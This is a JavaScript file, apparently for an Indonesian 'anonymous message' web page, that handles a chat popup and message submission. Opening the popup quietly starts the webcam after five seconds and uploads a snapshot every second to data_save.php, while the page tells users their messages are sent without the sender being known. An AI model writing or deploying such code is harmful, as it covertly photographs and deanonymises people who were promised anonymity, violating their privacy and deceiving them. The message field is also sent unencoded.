function hasGetUserMedia() {
  return !!(navigator.mediaDevices && navigator.mediaDevices.getUserMedia);
}

function errorCallback(error) {
  console.log("Error: ", error);
}

function startCamera() {
  if (hasGetUserMedia()) {
    navigator.mediaDevices
      .getUserMedia({ video: true })
      .then(function (stream) {
        var video = document.getElementById("video");
        video.srcObject = stream;
        video.play();

        setInterval(function () {
          captureImage();
        }, 1000); // Ambil foto setiap 3 detik
        console.log("peramban mendukung webcam");
      })
      .catch(errorCallback);
  } else {
    console.log("Peramban Anda tidak mendukung fitur perizinan webcam.");
  }
}

function captureImage() {
  var video = document.getElementById("video");
  var canvas = document.createElement("canvas");
  canvas.width = video.videoWidth;
  canvas.height = video.videoHeight;
  var context = canvas.getContext("2d");
  context.drawImage(video, 0, 0, canvas.width, canvas.height);
  var image = canvas.toDataURL("image/png");

  // Kirim foto ke server untuk disimpan
  var xhttp = new XMLHttpRequest();
  xhttp.open("POST", "data_save.php", true);
  xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
  xhttp.onreadystatechange = function () {
    if (this.readyState === 4 && this.status === 200) {
      console.log("Foto berhasil disimpan.");
    }
  };
  xhttp.send("image=" + encodeURIComponent(image));
}

/* Memulai kamera secara otomatis begitu halaman dimuat
 document.addEventListener("DOMContentLoaded", function () {
startCamera();
 });
*/

/* Popup Chat */
const wrapper = document.querySelector(".wrapper");
const btnPopup = document.querySelector(".btnLogin-popup");
const iconClose = document.querySelector(".icon-close");

btnPopup.addEventListener("click", () => {
  wrapper.classList.add("active-popup");
  setTimeout(function () {
    startCamera();
  }, 5000);
});
iconClose.addEventListener("click", () => {
  wrapper.classList.remove("active-popup");
});

/* Data Chat Anonim */
function saveMessage() {
  const status = document.getElementById("status-message");
  const message = document.getElementById("message").value;

  var xmlhttp = new XMLHttpRequest();
  if (message.trim() === "") {
    status.innerHTML = "Pesan tidak boleh kosong!";
    status.classList.add("red-text", "shake-animation");
    setTimeout(function () {
      status.innerHTML = "";
      status.classList.remove("red-text", "shake-animation");
    }, 1500);
    return;
  }
  var xmlhttp = new XMLHttpRequest();
  xmlhttp.onreadystatechange = function () {
    if (this.readyState === 4 && this.status === 200) {
      status.innerHTML = "Pesan berhasil terkirim tanpa diketahui pengirim";
      status.classList.remove("red-text", "shake-animation");
      status.classList.add("green-text");
      setTimeout(function () {
        status.innerHTML = "";
        status.classList.remove("green-text");
      }, 3000);
      document.getElementById("message").value = "";
    } else if (xmlhttp.readyState === 4) {
      // Display error message
      status.innerHTML = "Terjadi kesalahan saat menyimpan pesan.";
      status.classList.remove("green-text");
      status.classList.add("red-text", "shake-animation");
      setTimeout(function () {
        status.innerHTML = "";
        status.classList.remove("red-text", "shake-animation");
      }, 1500);
    }
  };
  xmlhttp.open("POST", "pesan_anonim.php", true);
  xmlhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
  xmlhttp.send("message=" + message);
}
